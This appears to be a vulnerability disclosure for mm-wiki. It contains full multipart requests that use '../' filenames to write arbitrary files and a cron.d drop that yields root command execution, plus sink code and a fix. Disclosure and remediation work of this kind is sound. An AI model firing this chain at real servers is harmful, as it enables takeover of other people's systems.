### Vulnerability details

**Official website / Product:** https://github.com/phachon/mm-wiki

**Repository:** phachon/mm-wiki (stars at selection: 3780)

**Vulnerability type:** file_upload (multipart filename path traversal → arbitrary file write → getshell)

**Vulnerability versions:** <= v0.2.1 and default-branch HEAD `d976d0c` (upload sinks in `app/controllers/image.go` / `attachment.go` unchanged)

**Vulnerability URL / Parameter:** `POST /image/upload` (multipart filename on `editormd-image-file`) and `POST /attachment/upload` (multipart filename on `attachment`); also requires `document_id`; needs an `isEditor` session on the document's space (system admin not required)

**Complex:** yes

### Verification procedure

1. Bring up a reconstructable lab: official release `mm-wiki-v0.2.1-linux-amd64.tar.gz` (https://github.com/phachon/mm-wiki/releases/tag/v0.2.1) + MySQL 8; host port **18702** → app `8080`; document root `/data/mm-wiki`; start with `./mm-wiki --conf conf/mm-wiki.conf` (evidence stack: `mysql:8.0` + `debian:bookworm-slim`). Audited default-branch HEAD `d976d0c604847503bfcea2829489ce278e2c6cf7` (upload sinks identical to v0.2.1). Equivalent bring-up:

```bash
# 1) MySQL 8 (empty DB; mm-wiki install wizard creates schema)
docker run -d --name mmwiki-r7a2-db \
  -e MYSQL_ROOT_PASSWORD=root \
  -e MYSQL_DATABASE=mm_wiki \
  -e MYSQL_USER=mmwiki \
  -e MYSQL_PASSWORD=mmwiki \
  mysql:8.0

# 2) App container: download official binary, complete web install, then start
docker run -d --name mmwiki-r7a2 --link mmwiki-r7a2-db:db \
  -p 18702:8080 \
  -w /data/mm-wiki \
  debian:bookworm-slim \
  bash -lc 'apt-get update && apt-get install -y wget ca-certificates cron && \
    wget -qO /tmp/mm.tgz https://github.com/phachon/mm-wiki/releases/download/v0.2.1/mm-wiki-v0.2.1-linux-amd64.tar.gz && \
    tar -xzf /tmp/mm.tgz -C /data/mm-wiki && \
    # complete web install against MySQL (host=db, db=mm_wiki, user/pass as above), \
    # document root /data/mm-wiki, listen 0.0.0.0:8080, admin root/123456; then: \
    ./mm-wiki --conf conf/mm-wiki.conf'
# wait until http://127.0.0.1:18702 responds
```

Equivalent: any host/VM with MySQL 8 + the same tarball; follow upstream install (`cd install && ./install`, then `./mm-wiki --conf conf/mm-wiki.conf`). Map the listen port to **18702** to match the PoC Host header, or change the Host header to your port.

2. After install/seed, log in as default admin `root` / `123456` and capture `mmwikissid` / `mmwikipassport` cookies.
3. Create a public space and a page document (PoC uses `document_id=2`, matching `images/1/2/` depth; five `../` segments from that directory reach FS root).
4. `POST /image/upload` with multipart: set `editormd-image-file` filename to five `../` segments (from `/data/mm-wiki/images/{space}/{doc}` to FS root), e.g. `../../../../../tmp/r7a2_final_proof.txt`, body arbitrary (e.g. `r7a2-getshell-proof`).
5. Confirm response `success:1` and container file `/tmp/r7a2_final_proof.txt`:

```bash
docker exec mmwiki-r7a2 ls -la /tmp/r7a2_final_proof.txt
docker exec mmwiki-r7a2 cat /tmp/r7a2_final_proof.txt
# → r7a2-getshell-proof
```

6. Getshell chain (process often runs as root with cron available): `POST /attachment/upload` with `attachment` filename `../../../../../etc/cron.d/r7a2-final` and crontab body `* * * * * root id > /tmp/r7a2_cron_fired`.
7. Confirm `/etc/cron.d/r7a2-final` on disk; after cron fires, `/tmp/r7a2_cron_fired` contains `uid=0(root)`:

```bash
docker exec mmwiki-r7a2 ls -la /etc/cron.d/r7a2-final
docker exec mmwiki-r7a2 cat /etc/cron.d/r7a2-final
# after cron fires:
docker exec mmwiki-r7a2 cat /tmp/r7a2_cron_fired
# → uid=0(root) gid=0(root) groups=0(root)
```

Vulnerability HTTP request:

```http
POST /image/upload HTTP/1.1
Host: 127.0.0.1:18702
Cookie: mmwikissid=<session>; mmwikipassport=<passport>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr7a2

------WebKitFormBoundaryr7a2
Content-Disposition: form-data; name="document_id"

2
------WebKitFormBoundaryr7a2
Content-Disposition: form-data; name="editormd-image-file"; filename="../../../../../tmp/r7a2_final_proof.txt"
Content-Type: image/png

r7a2-getshell-proof
------WebKitFormBoundaryr7a2--
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8
Date: Sun, 01 Nov 2026 11:24:20 GMT
Content-Length: 98

{"success":1,"message":"上传成功","url":"/images/1/2/../../../../../tmp/r7a2_final_proof.txt"}
```

Second request (cron.d getshell chain via `/attachment/upload`):

```http
POST /attachment/upload HTTP/1.1
Host: 127.0.0.1:18702
Cookie: mmwikissid=<session>; mmwikipassport=<passport>
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryr7a2b

------WebKitFormBoundaryr7a2b
Content-Disposition: form-data; name="document_id"

2
------WebKitFormBoundaryr7a2b
Content-Disposition: form-data; name="attachment"; filename="../../../../../etc/cron.d/r7a2-final"
Content-Type: text/plain

* * * * * root id > /tmp/r7a2_cron_fired
------WebKitFormBoundaryr7a2b--
```

```http
HTTP/1.1 200 OK
Content-Type: application/json; charset=utf-8

{
	"code": 1,
	"message": "附件上传成功",
	"data": "",
	"redirect": {
		"sleep": 2000,
		"url": "/attachment/page?document_id=2"
	}
}
```

Verification result:

Container filesystem and cron execution proof:

```
===PROOF===
-rw-r--r-- 1 root root 41 Nov  1 11:24 /etc/cron.d/r7a2-final
-rw-r--r-- 1 root root 41 Nov  1 11:23 /etc/cron.d/r7a2-pwn
-rw-r--r-- 1 root root 20 Nov  1 11:24 /tmp/r7a2_final_proof.txt
---
r7a2-getshell-proof
---
* * * * * root id > /tmp/r7a2_cron_fired
---
uid=0(root) gid=0(root) groups=0(root)
```

### Vulnerability analysis

Both image and attachment upload handlers take the client-supplied multipart `Filename` and pass it directly to `path.Join(saveDir, h.Filename)` then `SaveToFile`, with **no** `filepath.Base`, extension allow-list, or containment check under the intended directory. Go's `path.Join` cleans `../`, so the write escapes `images/{space}/{doc}` / `attachment/{space}/{doc}` (under the official layout `ImageAbsDir`/`AttachmentAbsDir` live under `/data/mm-wiki/...`).

An existence check only blocks **overwrite** of paths that already exist; **new** files anywhere the process can create (including `/etc/cron.d/` when running as root in the official Docker-style layout) succeed, and the raw traversal string is also stored in `mw_attachment.path`.

Impact: authenticated space editor (`isEditor`) → arbitrary file write as the mm-wiki UID → getshell via cron drop (or similar writable exec/config locations).

Vulnerable trigger / sink source (complete path and line numbers):

```go
# File: app/controllers/image.go
# Lines: 72-90
	// file save dir
	saveDir := fmt.Sprintf("%s/%s/%s", app.ImageAbsDir, spaceId, documentId)
	ok, _ := utils.File.PathIsExists(saveDir)
	if !ok {
		err := os.MkdirAll(saveDir, 0777)
		if err != nil {
			this.ErrorLog("上传图片错误: " + err.Error())
			this.jsonError("上传图片失败")
			return
		}
	}
	// check file is exists
	imageFile := path.Join(saveDir, h.Filename)
	ok, _ = utils.File.PathIsExists(imageFile)
	if ok {
		this.jsonError("该图片已经上传过！")
	}
	// save file
	err = this.SaveToFile("editormd-image-file", imageFile)
```

```go
# File: app/controllers/attachment.go
# Lines: 127-145
	saveDir := fmt.Sprintf("%s/%s/%s", app.AttachmentAbsDir, spaceId, documentId)
	ok, _ := utils.File.PathIsExists(saveDir)
	if !ok {
		err := os.MkdirAll(saveDir, 0777)
		if err != nil {
			this.ErrorLog("上传附件错误: " + err.Error())
			this.uploadJsonError("上传附件失败")
			return
		}
	}
	attachmentFile := path.Join(saveDir, h.Filename)
	ok, _ = utils.File.PathIsExists(attachmentFile)
	if ok {
		this.uploadJsonError("该附件已经存在！")
	}
	err = this.SaveToFile("attachment", attachmentFile)
```

### Vulnerability Fix

Sanitize with `filepath.Base(h.Filename)` (or reject names containing `..`, `/`, `\`), resolve with `filepath.Abs`, and require `strings.HasPrefix(resolved, saveDir+string(os.PathSeparator))` before `SaveToFile`. Prefer server-generated UUIDs for stored names.
